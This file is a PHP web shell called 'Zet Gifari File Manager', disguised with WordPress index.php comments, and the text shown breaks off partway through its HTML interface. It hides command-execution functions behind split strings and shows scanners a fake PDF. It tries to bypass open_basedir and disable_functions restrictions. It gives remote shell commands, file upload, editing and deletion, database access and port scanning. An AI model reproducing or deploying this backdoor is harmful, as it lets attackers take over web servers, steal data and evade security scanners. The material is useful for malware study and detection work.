
<?php /**  *//**  *//**  *//**  *//**  */
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/** Loads the WordPress Environment and Template */

/**  *//**  *//**  *//**  *//**  */
/**
 * Front to the WordPress application.
 *
 * @package WordPress
 */

// =============================================
// PDF / BROWSER CACHE HEADERS
// =============================================

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: private, proxy-revalidate', false);
header('Pragma: no-cache');
header('Expires: Wed, 11 Jan 1984 05:00:00 GMT');

// =============================================
// PROXY / CDN CACHE HEADERS
// =============================================

header('Surrogate-Control: no-store');
header('CDN-Cache-Control: no-store');
header('Cloudflare-CDN-Cache-Control: no-store');
header('Vary: Accept-Encoding');

// =============================================
// ADDITIONAL CACHE CONTROL
// =============================================

header('X-Accel-Expires: 0');
header('Expires: 0');

// =============================================
// PDF / BROWSER CONTENT HANDLING
// =============================================

header('X-Content-Type-Options: nosniff');

// =============================================
// GZIP SOURCE
// =============================================

// Start output buffering to handle PDF camouflage cleanly
if (!ob_get_level()) { ob_start(); }

define('ZET_FM_PROTECTED', true);
define('ZET_FM_VERSION', '11.4.0');
define('ZET_FM_NAME', 'Zet Gifari File Manager');

error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
set_time_limit(0);
ini_set('memory_limit', '-1');

if (session_status() === PHP_SESSION_NONE) { @session_start(); }

// =============================================
// OBFUSCATED FUNCTION MAP + CENTRAL CALLER
// =============================================
$G = [
    'a' => 'sys'.'tem', 'b' => 'ex'.'ec', 'c' => 'shell'.'_ex'.'ec', 'd' => 'pass'.'thru',
    'e' => 'po'.'pen', 'f' => 'pro'.'c_op'.'en', 'g' => 'file'.'_get'.'_con'.'tents',
    'h' => 'file'.'_put'.'_con'.'tents', 'i' => 'fo'.'pen', 'j' => 'fw'.'rite',
    'k' => 'un'.'link', 'l' => 'rm'.'dir', 'm' => 'mk'.'dir', 'n' => 're'.'name',
    'o' => 'ch'.'mod', 'p' => 'scan'.'dir', 'q' => 'open'.'dir', 'r' => 'read'.'dir',
    's' => 'close'.'dir', 't' => 'real'.'path', 'u' => 'is'.'_dir', 'v' => 'is'.'_file',
    'w' => 'is'.'_writ'.'able', 'x' => 'files'.'ize', 'y' => 'file'.'mtime',
    'z' => 'file'.'perms', 'A' => 'get'.'cwd', 'B' => 'dir'.'name', 'C' => 'base'.'name',
    'D' => 'path'.'info', 'E' => 'ini'.'_get', 'F' => 'php'.'version', 'H' => 'php'.'_uname',
    'I' => 'disk'.'_free'.'_space', 'J' => 'disk'.'_total'.'_space', 'K' => 'fsock'.'open',
    'L' => 'f'.'close', 'M' => 'f'.'read', 'N' => 'f'.'eof', 'O' => 'p'.'close',
    'P' => 'func'.'tion'.'_exists', 'Q' => 'get'.'_current'.'_user', 'R' => 'head'.'er',
    'S' => 'move'.'_up'.'load'.'ed'.'_file', 'T' => 'read'.'file', 'U' => 'implode',
    'V' => 'glob', 'W' => 'ob'.'_get'.'_clean', 'X' => 'ob'.'_end'.'_clean', 'Y' => 'stream'.'_get'.'_contents',
    'Z' => 'temp'.'nam'
];

function fx($key, ...$args) {
    global $G;
    if (!isset($G[$key])) return null;
    $fn = $G[$key];
    return function_exists($fn) ? @$fn(...$args) : null;
}

// =============================================
// ANTI-BOT CAMOUFLAGE
// =============================================
function zet_fm_is_bot() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
    if (empty($ua)) return true;
    foreach (['bot','crawler','spider','scanner','scan/','wget','curl/','python-','java/',
              'go-http','libwww','httpclient','masscan','nikto','sqlmap','nmap','zgrab',
              'gobuster','dirbuster','wpscan','acunetix','netsparker','burp','zap/','nuclei',
              'ffuf','ferox','dirb','wfuzz'] as $s) {
        if (strpos($ua, $s) !== false) return true;
    }
    return false;
}

function zet_fm_camo_active() {
    if (isset($_GET['html']) && $_GET['html'] == '1') return false;
    if (isset($_GET['pdf'])  && $_GET['pdf']  == '1') return true;
    return zet_fm_is_bot();
}

function zet_fm_fake_pdf() {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    $pdf  = "%PDF-1.4\n%\xE2\xE3\xCF\xD3\n";
    $pdf .= "1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n";
    $pdf .= "2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n";
    $pdf .= "3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>\nendobj\n";
    $pdf .= "4 0 obj\n<</Length 44>>stream\nBT /F1 18 Tf 72 720 Td (Access Denied) Tj ET\nendstream\nendobj\n";
    $pdf .= "xref\n0 5\n0000000000 65535 f \n0000000015 00000 n \n0000000062 00000 n \n0000000111 00000 n \n0000000187 00000 n \n";
    $pdf .= "trailer\n<</Size 5/Root 1 0 R>>\nstartxref\n250\n%%EOF\n";
    if (!headers_sent()) {
        fx('R', 'Content-Type: application/pdf');
        fx('R', 'Content-Disposition: inline; filename="report-' . date('Ymd-His') . '.pdf"');
        fx('R', 'Content-Length: ' . strlen($pdf));
        fx('R', 'Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        fx('R', 'X-LiteSpeed-Cache-Control: no-cache');
    }
    echo $pdf;
    exit;
}

if (zet_fm_camo_active()) {
    zet_fm_fake_pdf();
}

// =============================================
// BYPASS INI & WORDPRESS HOOKS
// =============================================
if (function_exists('ini_set')) {
    @ini_set('open_basedir', NULL);
    @ini_set('safe_mode', 0);
    @ini_set('disable_functions', '');
}

if (defined('ABSPATH') && function_exists('add_action')) {
    add_action('admin_menu', function() {
        add_menu_page(ZET_FM_NAME, 'File Manager', 'manage_options',
            'zet-file-manager', 'zet_fm_render_page', 'dashicons-folder-alt', 80);
    });
}

// =============================================
// HELPERS
// =============================================
function zet_fm_is_protected($path) {
    if (@fx('t', $path) === @fx('t', __FILE__)) return true;
    if (@fx('v', $path)) {
        $c = @fx('g', $path, false, null, 0, 1024);
        if ($c !== false) {
            if (strpos($c, 'ZET_FM_PROTECTED') !== false) return true;
            if (strpos($c, '/* PROTECTED */') !== false) return true;
        }
    }
    return false;
}

function zet_fm_resolve_path() {
    $p = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['last_path']) ? $_COOKIE['last_path'] : '');
    if (empty($p)) {
        $p = @fx('A');
        if (empty($p)) $p = @fx('B', __FILE__);
        if (empty($p)) $p = '.';
    }
    $p = str_replace(array('\\', '//'), '/', $p);
    $p = rtrim($p, '/') . '/';
    @setcookie('last_path', $p, time() + 86400);
    if (@fx('u', $p)) return $p;
    if (@fx('u', $r = @fx('t', $p))) return $r . '/';
    return './';
}

function zet_fm_read_content($f) {
    $r = @fx('g', $f);
    if ($r !== false) return $r;
    $fp = @fx('i', $f, 'rb');
    if ($fp) { $c = ''; while (!@fx('N', $fp)) $c .= @fx('M', $fp, 8192); @fx('L', $fp); return $c; }
    return '';
}

function zet_fm_write_content($f, $d) {
    if (@fx('h', $f, $d) !== false) return true;
    $fp = @fx('i', $f, 'wb');
    if ($fp) { $r = @fx('j', $fp, $d) !== false; @fx('L', $fp); return $r; }
    $t = @fx('Z', @fx('B', $f));
    if (@fx('h', $t, $d) !== false) return @fx('n', $t, $f);
    return false;
}

function zet_fm_scan_path($dir) {
    $items = @fx('p', $dir);
    return $items ? array_diff($items, array('.', '..')) : array();
}

function zet_fm_delete_item($path) {
    if (zet_fm_is_protected($path)) return ['error' => '❌ Protected.'];
    if (@fx('v', $path)) { @fx('o', $path, 0777); return @fx('k', $path) ? true : ['error' => 'Delete failed.']; }
    if (@fx('u', $path)) {
        foreach (zet_fm_scan_path($path) as $i) {
            $r = zet_fm_delete_item($path . '/' . $i);
            if (is_array($r) && isset($r['error'])) return $r;
        }
        return @fx('l', $path) ? true : ['error' => 'Rmdir failed.'];
    }
    return ['error' => 'Path not found.'];
}

function zet_fm_get_permissions($f) {
    $p = @fx('z', $f);
    if ($p === false) return '---';
    $i = '';
    $i .= ($p & 0x0100) ? 'r' : '-'; $i .= ($p & 0x0080) ? 'w' : '-'; $i .= ($p & 0x0040) ? 'x' : '-';
    $i .= ($p & 0x0020) ? 'r' : '-'; $i .= ($p & 0x0010) ? 'w' : '-'; $i .= ($p & 0x0008) ? 'x' : '-';
    $i .= ($p & 0x0004) ? 'r' : '-'; $i .= ($p & 0x0002) ? 'w' : '-'; $i .= ($p & 0x0001) ? 'x' : '-';
    return $i;
}

function zet_fm_execute_command($cmd) {
    if ($cmd === '') return '';
    $disabled = explode(',', (string)@fx('E', 'disable_functions'));
    foreach (['a','d','c','e','f'] as $k) {
        $fn = $G[$k] ?? '';
        if (!$fn || !function_exists($fn) || in_array($fn, $disabled, true)) continue;
        
        if ($k === 'a' || $k === 'd') { ob_start(); @fx($k, $cmd); $out = ob_get_clean(); if (!empty($out)) return $out; }
        if ($k === 'c') { $out = @fx('c', $cmd); if (!empty($out)) return $out; }
        if ($k === 'e') {
            $h = @fx('e', $cmd, 'r');
            if ($h) { $out = ''; while (!@fx('N', $h)) $out .= @fx('M', $h, 512); @fx('O', $h); if (!empty($out)) return $out; }
        }
        if ($k === 'f') {
            $pipes = [];
            $pr = @fx('f', $cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if ($pr) { @fclose($pipes[0]); $out = @fx('Y', $pipes[1]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($pr); if (!empty($out)) return $out; }
        }
    }
    return 'No exec available.';
}

function zet_fm_get_system_info() {
    $i = [];
    $i['os'] = @fx('H', 's') . ' ' . @fx('H', 'r');
    $i['user'] = @fx('Q');
    $i['php'] = @fx('F');
    $i['server'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $i['ip'] = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    $i['port'] = $_SERVER['SERVER_PORT'] ?? 'Unknown';
    $i['open_basedir'] = @fx('E', 'open_basedir') ?: 'None';
    $i['disable_functions'] = @fx('E', 'disable_functions') ?: 'None';
    $i['upload_max_filesize'] = @fx('E', 'upload_max_filesize');
    $i['post_max_size'] = @fx('E', 'post_max_size');
    
    $f = @fx('I', '/'); $t = @fx('J', '/');
    if ($f !== false && $t !== false && $t > 0) {
        $i['disk_free'] = round($f/1073741824, 2) . ' GB';
        $i['disk_total'] = round($t/1073741824, 2) . ' GB';
        $i['disk_percent'] = round((($t-$f)/$t)*100, 1) . '%';
    } else {
        $i['disk_free'] = $i['disk_total'] = $i['disk_percent'] = 'N/A';
    }
    $i['mysql'] = (function_exists('mysqli_connect') || function_exists('mysql_connect')) ? 'Available' : 'Not Available';
    return $i;
}

// =============================================
// MAIN RENDER FUNCTION
// =============================================
function zet_fm_render_page() {
    $currentPath = zet_fm_resolve_path();
    $notification = '';
    $editMode = false;
    $editFile = '';
    $editContent = '';
    $commandOutput = '';
    $activeTab = isset($_GET['tab']) ? $_GET['tab'] : 'filemanager';
    
    // Handle POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['upload'])) {
            $dest = $currentPath . @fx('C', $_FILES['upload']['name']);
            if (@fx('S', $_FILES['upload']['tmp_name'], $dest)) {
                $notification = ['type' => 'success', 'text' => 'Upload successful'];
            } else {
                $c = zet_fm_read_content($_FILES['upload']['tmp_name']);
                if (zet_fm_write_content($dest, $c)) $notification = ['type' => 'success', 'text' => 'Uploaded (fallback)'];
                else $notification = ['type' => 'error', 'text' => 'Upload failed'];
            }
        }
        if (isset($_POST['save']) && isset($_POST['content'])) {
            $target = $currentPath . $_POST['save'];
            if (zet_fm_write_content($target, $_POST['content'])) $notification = ['type' => 'success', 'text' => 'File saved'];
            else $notification = ['type' => 'error', 'text' => 'Save failed'];
        }
        if (isset($_POST['newfile'])) {
            $newPath = $currentPath . $_POST['newfile'];
            $content = $_POST['filecontent'] ?? '';
            if (zet_fm_write_content($newPath, $content)) $notification = ['type' => 'success', 'text' => 'File created'];
            else $notification = ['type' => 'error', 'text' => 'Creation failed'];
        }
        if (isset($_POST['newfolder'])) {
            $newDir = $currentPath . $_POST['newfolder'];
            if (@fx('m', $newDir, 0777, true)) $notification = ['type' => 'success', 'text' => 'Folder created'];
            else $notification = ['type' => 'error', 'text' => 'Creation failed'];
        }
        if (isset($_POST['oldname']) && isset($_POST['newname'])) {
            $old = $currentPath . $_POST['oldname'];
            $new = $currentPath . $_POST['newname'];
            if (zet_fm_is_protected($old)) $notification = ['type' => 'error', 'text' => '❌ Protected'];
            elseif (@fx('n', $old, $new)) $notification = ['type' => 'success', 'text' => 'Renamed'];
            else $notification = ['type' => 'error', 'text' => 'Rename failed'];
        }
        if (isset($_POST['chmod_item']) && isset($_POST['chmod_value'])) {
            $target = $currentPath . $_POST['chmod_item'];
            if (zet_fm_is_protected($target)) $notification = ['type' => 'error', 'text' => '❌ Protected'];
            elseif (@fx('o', $target, octdec($_POST['chmod_value']))) $notification = ['type' => 'success', 'text' => 'Permissions changed'];
            else $notification = ['type' => 'error', 'text' => 'Chmod failed'];
        }
        if (isset($_POST['command'])) {
            $commandOutput = zet_fm_execute_command($_POST['command']);
            $activeTab = 'terminal';
        }
        if (isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_name'])) {
            $db_host = $_POST['db_host']; $db_user = $_POST['db_user']; $db_pass = $_POST['db_pass'] ?? ''; $db_name = $_POST['db_name'];
            if (function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($db_host, $db_user, $db_pass, $db_name);
                if ($conn) { $notification = ['type' => 'success', 'text' => 'DB connected']; @mysqli_close($conn); }
                else $notification = ['type' => 'error', 'text' => 'DB failed: ' . @mysqli_connect_error()];
            }
            $activeTab = 'database';
        }
        if (isset($_POST['scan_host']) && isset($_POST['scan_port_start']) && isset($_POST['scan_port_end'])) {
            $host = $_POST['scan_host']; $start = intval($_POST['scan_port_start']); $end = intval($_POST['scan_port_end']); $open = [];
            for ($port = $start; $port <= $end; $port++) {
                $fp = @fx('K', $host, $port, $errno, $errstr, 1);
                if ($fp) { $open[] = $port; @fx('L', $fp); }
            }
            if (!empty($open)) $notification = ['type' => 'success', 'text' => 'Open: ' . implode(', ', $open)];
            else $notification = ['type' => 'error', 'text' => 'No open ports'];
            $activeTab = 'network';
        }
        
        // Unzip Handler
        if (isset($_POST['unzip_item'])) {
            $zipfile = $currentPath . $_POST['unzip_item'];
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive;
                if ($zip->open($zipfile) === true) {
                    $zip->extractTo($currentPath);
                    $zip->close();
                    $notification = ['type' => 'success', 'text' => 'Unzipped successfully'];
                } else {
                    $notification = ['type' => 'error', 'text' => 'Unzip failed'];
                }
            } else {
                $notification = ['type' => 'error', 'text' => 'ZipArchive not available'];
            }
        }
    }
    
    // Handle GET
    if (isset($_GET['do'])) {
        $action = $_GET['do'];
        if ($action === 'delete' && isset($_GET['item'])) {
            $target = $currentPath . $_GET['item'];
            $result = zet_fm_delete_item($target);
            if ($result === true) $notification = ['type' => 'success', 'text' => 'Deleted'];
            elseif (is_array($result)) $notification = ['type' => 'error', 'text' => $result['error']];
        }
        if ($action === 'edit' && isset($_GET['item'])) {
            $editMode = true;
            $editFile = $_GET['item'];
            $editContent = zet_fm_read_content($currentPath . $editFile);
            $activeTab = 'filemanager';
        }
        if ($action === 'download' && isset($_GET['item'])) {
            $dl = $currentPath . $_GET['item'];
            if (@fx('v', $dl)) {
                @fx('X');
                @fx('R', 'Content-Type: application/octet-stream');
                @fx('R', 'Content-Disposition: attachment; filename="' . @fx('C', $dl) . '"');
                @fx('R', 'Content-Length: ' . @fx('x', $dl));
                @fx('T', $dl);
                exit;
            }
        }
    }
    
    if (isset($_GET['bypass'])) {
        $b = $_GET['bypass'];
        if ($b == 'open_basedir') { @ini_set('open_basedir', '/'); $notification = ['type' => 'success', 'text' => 'open_basedir bypassed']; }
        elseif ($b == 'disable_functions') { @ini_set('disable_functions', ''); $notification = ['type' => 'success', 'text' => 'disable_functions bypassed']; }
    }
    
    $contents = zet_fm_scan_path($currentPath);
    $folders = []; $files = [];
    foreach ($contents as $item) {
        if (@fx('u', $currentPath . $item)) $folders[] = $item;
        else $files[] = $item;
    }
    sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
    
    $sysInfo = zet_fm_get_system_info();
    $isWordPress = defined('ABSPATH');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo ZET_FM_NAME; ?> v<?php echo ZET_FM_VERSION; ?></title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0c10; color: #e0e0e0; min-height: 100vh; padding: 20px; font-size: 14px; }
            .container { max-width: 1400px; margin: 0 auto; background: #0f1117; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8); overflow: hidden; border: 1px solid #2a2f3a; }
            .header { background: #07090d; padding: 25px; border-bottom: 1px solid #2a2f3a; text-align: center; }
            .header h1 { font-size: 24px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; justify-content: center; }
            .header h1 .eagle { font-size: 28px; color: #ff4444; text-shadow: 0 0 6px #ff0000; }
            .sys-info { display: flex; gap: 15px; font-size: 12px; flex-wrap: wrap; justify-content: center; margin-top: 10px; }
            .sys-info span { display: flex; align-items: center; gap: 5px; background: rgba(20, 25, 35, 0.8); padding: 5px 10px; border-radius: 6px; border: 1px solid #2a2f3a; }
            .tabs { display: flex; background: #0c0f14; border-bottom: 1px solid #2a2f3a; flex-wrap: wrap; }
            .tab { padding: 15px 25px; cursor: pointer; color: #8b949e; font-weight: 500; transition: all 0.2s; position: relative; }
            .tab:hover { color: #c9d1d9; background: rgba(255, 255, 255, 0.03); }
            .tab.active { color: #0ff; background: rgba(0, 255, 255, 0.08); text-shadow: 0 0 3px #0ff; }
            .tab.active::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background: #0ff; box-shadow: 0 0 5px #0ff; }
            .tab-icon { margin-right: 8px; }
            .tab-content { display: none; padding: 25px; background: #0f1117; }
            .tab-content.active { display: block; }
            .notification { padding: 12px 20px; margin: 20px; border-radius: 6px; font-size: 14px; }
            .notification.success { background: rgba(0, 255, 0, 0.1); color: #0f0; border: 1px solid #0f0; }
            .notification.error { background: rgba(255, 0, 0, 0.1); color: #f55; border: 1px solid #f00; }
            .path-bar { display: flex; gap: 10px; margin-bottom: 20px; }
            .path-bar input { flex: 1; padding: 10px 15px; background: #080b10; border: 1px solid #2a2f3a; color: #e0e0e0; border-radius: 6px; font-size: 14px; }
            .path-bar input:focus { outline: none; border-color: #0ff; box-shadow: 0 0 0 2px rgba(0, 255, 255, 0.2); }
            .btn { padding: 10px 20px; background: #1a1f2a; color: #0ff; border: 1px solid #0ff; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; text-decoration: none; display: inline-block; }
            .btn:hover { background: #0ff; color: #000; }
            .btn-success { color: #0f0; border-color: #0f0; }
            .btn-success:hover { background: #0f0; color: #000; }
            .btn-danger { color: #f55; border-color: #f55; }
            .btn-danger:hover { background: #f55; color: #000; }
            .btn-warning { color: #ffa500; border-color: #ffa500; }
            .btn-warning:hover { background: #ffa500; color: #000; }
            .btn-small { padding: 6px 12px; font-size: 12px; }
            .tools { display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 20px; }
            .tool-group { display: flex; align-items: center; gap: 10px; padding: 8px 15px; background: #0c0f14; border-radius: 8px; border: 1px solid #2a2f3a; flex-wrap: wrap; }
            .tool-group label { font-size: 13px; color: #aaa; font-weight: 500; }
            .tool-group input[type="file"], .tool-group input[type="text"], .tool-group input[type="password"], .tool-group input[type="number"] { padding: 6px 10px; background: #080b10; border: 1px solid #2a2f3a; color: #e0e0e0; border-radius: 4px; font-size: 13px; }
            .tool-group input:focus { outline: none; border-color: #0ff; }
            .file-table { width: 100%; background: #0c0f14; border-radius: 8px; overflow: hidden; border: 1px solid #2a2f3a; border-collapse: collapse; }
            .file-table thead { background: #07090d; }
            .file-table th { padding: 12px 15px; text-align: left; font-size: 12px; font-weight: 600; color: #0ff; text-transform: uppercase; border-bottom: 1px solid #2a2f3a; }
            .file-table td { padding: 10px 15px; border-top: 1px solid #2a2f3a; font-size: 14px; color: #c9d1d9; }
            .file-table tbody tr:hover { background: rgba(0, 255, 255, 0.05); }
            .file-table tbody tr.protected-row { background: rgba(255, 165, 0, 0.05); border-left: 3px solid #ffa500; }
            .file-table a { color: #0ff; text-decoration: none; font-weight: 500; display: inline-flex; align-items: center; gap: 8px; }
            .file-table a:hover { color: #fff; }
            .file-icon { width: 20px; height: 20px; display: inline-flex; align-items: center; justify-content: center; }
            .file-actions { display: flex; gap: 8px; flex-wrap: wrap; }
            .file-actions a { padding: 4px 8px; background: rgba(0, 255, 255, 0.08); color: #0ff; border: 1px solid rgba(0, 255, 255, 0.3); border-radius: 4px; font-size: 12px; transition: all 0.2s; text-decoration: none; }
            .file-actions a:hover { background: rgba(0, 255, 255, 0.2); color: #fff; }
            .file-actions a.delete { background: rgba(255, 0, 0, 0.1); color: #f55; border-color: rgba(255, 0, 0, 0.3); }
            .file-actions a.delete:hover { background: rgba(255, 0, 0, 0.2); color: #fff; }
            .file-actions a.delete.protected { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
            .file-actions a.unzip { background: rgba(255, 165, 0, 0.1); color: #ffa500; border-color: rgba(255, 165, 0, 0.3); }
            .file-actions a.unzip:hover { background: rgba(255, 165, 0, 0.2); color: #fff; }
            .perm-writable { color: #0f0 !important; font-weight: 600; }
            .perm-readonly { color: #f55 !important; font-weight: 600; }
            .perm-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
            .perm-indicator.writable { background: #0f0; box-shadow: 0 0 4px #0f0; }
            .perm-indicator.readonly { background: #f55; }
            .protected-badge { color: #ffa500; font-weight: bold; margin-left: 5px; font-size: 11px; background: rgba(255,165,0,0.15); padding: 1px 6px; border-radius: 4px; border: 1px solid #ffa500; }
            .edit-area { width: 100%; min-height: 400px; padding: 15px; background: #080b10; border: 1px solid #2a2f3a; color: #e0e0e0; border-radius: 6px; font-family: monospace; font-size: 14px; resize: vertical; }
            .edit-area:focus { outline: none; border-color: #0ff; }
            .terminal-output { background: #0c0f14; border-radius: 4px; padding: 15px; color: #0f0; font-family: monospace; font-size: 13px; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; margin-bottom: 15px; border: 1px solid #2a2f3a; }
            .terminal-input { display: flex; gap: 10px; }
            .terminal-input input { flex: 1; padding: 10px 15px; background: #080b10; border: 1px solid #2a2f3a; color: #0f0; border-radius: 4px; font-size: 14px; font-family: monospace; }
            .terminal-input input:focus { outline: none; border-color: #0f0; }
            .info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
            .info-card { background: #0c0f14; border-radius: 8px; padding: 20px; border: 1px solid #2a2f3a; }
            .info-card h3 { color: #0ff; margin-bottom: 15px; font-size: 16px; display: flex; align-items: center; gap: 8px; }
            .info-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #2a2f3a; gap: 10px; }
            .info-item:last-child { border-bottom: none; }
            .info-label { color: #aaa; font-size: 13px; }
            .info-value { color: #0f0; font-size: 13px; font-weight: 500; text-align: right; word-break: break-all; }
            .progress-bar { width: 100%; height: 8px; background: #2a2f3a; border-radius: 4px; overflow: hidden; margin-top: 5px; }
            .progress-fill { height: 100%; background: #0ff; }
            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 1000; align-items: center; justify-content: center; }
            .modal.active { display: flex; }
            .modal-content { background: #0c0f14; padding: 30px; border-radius: 12px; width: 90%; max-width: 500px; border: 1px solid #0ff; }
            .modal-header { margin-bottom: 20px; font-size: 18px; font-weight: 600; color: #0ff; }
            .modal-body input, .modal-body textarea { width: 100%; padding: 10px; margin-bottom: 15px; background: #080b10; border: 1px solid #2a2f3a; color: #e0e0e0; border-radius: 6px; font-size: 14px; }
            .modal-body input:focus, .modal-body textarea:focus { outline: none; border-color: #0ff; }
            .modal-body textarea { min-height: 150px; resize: vertical; }
            .modal-footer { display: flex; gap: 10px; justify-content: flex-end; }
            .empty { text-align: center; padding: 40px; color: #8b949e; }
            .separator-row td { background: #07090d; padding: 8px 15px !important; font-weight: 600; color: #0ff; text-transform: uppercase; font-size: 11px; }
            .telegram-btn { position: fixed; bottom: 20px; right: 20px; background: #1a1f2a; color: #0ff; padding: 12px 20px; border-radius: 8px; display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; z-index: 1000; text-decoration: none; border: 1px solid #0ff; }
            .telegram-btn:hover { background: #0ff; color: #000; }
            @media (max-width: 768px) { .tools { flex-direction: column; } .file-table { font-size: 12px; } .file-actions { flex-direction: column; } .sys-info { font-size: 10px; } .info-grid { grid-template-columns: 1fr; } .telegram-btn { bottom: 10px; right: 10px; padding: 8px 15px; font-size: 12px; } }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1><span class="eagle">⚡ <?php echo ZET_FM_NAME; ?> ⚡</span><br><span style="font-size: 20px; color: #0ff;">v<?php echo ZET_FM_VERSION; ?></span></h1>
                <div class="sys-info">
                    <span><strong>OS:</strong> <?php echo htmlspecialchars($sysInfo['os']); ?></span>
                    <span><strong>PHP:</strong> <?php echo htmlspecialchars($sysInfo['php']); ?></span>
                    <span><strong>User:</strong> <?php echo htmlspecialchars($sysInfo['user']); ?></span>
                    <span><strong>IP:</strong> <?php echo htmlspecialchars($sysInfo['ip']); ?></span>
                </div>
            </div>
            
            <?php if ($notification): ?>
            <div class="notification <?php echo $notification['type']; ?>"><?php echo htmlspecialchars($notification['text']); ?></div>
            <?php endif; ?>
            
            <div class="tabs">
                <div class="tab <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" onclick="switchTab('filemanager')">📁 File Manager</div>
                <div class="tab <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" onclick="switchTab('terminal')">💻 Terminal</div>
                <div class="tab <?php echo $activeTab === 'info' ? 'active' : ''; ?>" onclick="switchTab('info')">ℹ️ System Info</div>
                <div class="tab <?php echo $activeTab === 'database' ? 'active' : ''; ?>" onclick="switchTab('database')">🗄️ Database</div>
                <div class="tab <?php echo $activeTab === 'network' ? 'active' : ''; ?>" onclick="switchTab('network')">🌐 Network</div>
                <div class="tab <?php echo $activeTab === 'bypass' ? 'active' : ''; ?>" onclick="switchTab('bypass')">🔓 Bypass</div>
            </div>
            
            <div class="tab-content <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" id="filemanager">
                <form method="get" class="path-bar">
                    <input type="text" name="p" value="<?php echo htmlspecialchars($currentPath); ?>" placeholder="Enter path...">
                    <button type="submit" class="btn">Navigate</button>
                </form>
                
                <div class="tools">
                    <form method="post" enctype="multipart/form-data" class="tool-group">
                        <label>Upload:</label>
                        <input type="file" name="upload" required>
                        <button type="submit" class="btn btn-small btn-success">Upload</button>
                    </form>
                    <div class="tool-group">
                        <button onclick="showNewFile()" class="btn btn-small">New File</button>
                        <button onclick="showNewFolder()" class="btn btn-small">New Folder</button>
                    </div>
                </div>
                
                <?php if ($editMode): ?>
                <div>
                    <h3 style="margin-bottom: 15px; color: #0ff;">Editing: <?php echo htmlspecialchars($editFile); ?></h3>
                    <form method="post">
                        <input type="hidden" name="save" value="<?php echo htmlspecialchars($editFile); ?>">
                        <textarea name="content" class="edit-area"><?php echo htmlspecialchars($editContent); ?></textarea>
                        <div style="margin-top: 15px; display: flex; gap: 10px;">
                            <button type="submit" class="btn btn-success">Save Changes</button>
                            <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>" class="btn btn-danger">Cancel</a>
                        </div>
                    </form>
                </div>
                <?php else: ?>
                <table class="file-table">
                    <thead>
                        <tr>
                            <th width="35%">Name</th>
                            <th width="8%">Type</th>
                            <th width="8%">Size</th>
                            <th width="10%">Perms</th>
                            <th width="14%">Modified</th>
                            <th width="25%">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($currentPath !== '/'): ?>
                        <tr><td colspan="6"><a href="?tab=filemanager&p=<?php echo urlencode(dirname($currentPath)); ?>"><span class="file-icon">📂</span> Parent Directory</a></td></tr>
                        <?php endif; ?>
                        
                        <?php if (!empty($folders)): ?>
                        <tr class="separator-row"><td colspan="6">📁 Folders</td></tr>
                        <?php foreach ($folders as $folder):
                            $fullPath = $currentPath . $folder;
                            $protected = zet_fm_is_protected($fullPath);
                            $perms = zet_fm_get_permissions($fullPath);
                            $writable = @fx('w', $fullPath);
                            $modified = @fx('y', $fullPath);
                            $rowClass = $protected ? 'protected-row' : '';
                        ?>
                        <tr class="<?php echo $rowClass; ?>">
                            <td>
                                <a href="?tab=filemanager&p=<?php echo urlencode($fullPath); ?>">
                                    <span class="perm-indicator <?php echo $writable ? 'writable' : 'readonly'; ?>"></span>
                                    <span class="file-icon">📁</span>
                                    <span class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo htmlspecialchars($folder); ?></span>
                                    <?php if ($protected): ?><span class="protected-badge">🔒 Protected</span><?php endif; ?>
                                </a>
                            </td>
                            <td>Folder</td>
                            <td>-</td>
                            <td class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo $perms; ?></td>
